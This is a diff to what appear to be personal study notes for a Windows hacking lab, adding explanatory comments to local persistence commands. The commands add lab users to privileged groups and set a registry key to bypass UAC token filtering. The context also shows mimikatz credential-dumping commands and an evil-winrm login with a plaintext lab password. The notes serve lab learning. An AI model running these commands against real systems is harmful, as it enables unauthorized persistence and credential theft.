@@ -462,11 +462,15 @@ token::elevate # simply put, this takes us from our administrative shell with hi
 lsadump::sam # list of password
 ```
 # Windows-Local-Persistence ✅
+
+> [!Note]
+> 
+
 ```powershell
-net localgroup administrators thmuser0 /add
-net localgroup "Backup Operators" thmuser1 /add
-net localgroup "Remote Management Users" thmuser1 /add
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 
+net localgroup administrators thmuser0 /add # Add User to Administrators Group (Administrators)
+net localgroup "Backup Operators" thmuser1 /add # Use the "Backup Operators" group (more secret than the previous method)
+net localgroup "Remote Management Users" thmuser1 /add # Add thmuser1 to "Remote Management Users Group" to enable RDP or WINRM connection
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 # Bypass UAC to activate “Backup Operators”
 
 evil-winrm -i 10.10.233.240 -u thmuser1 -p Password321
 whoami /groups
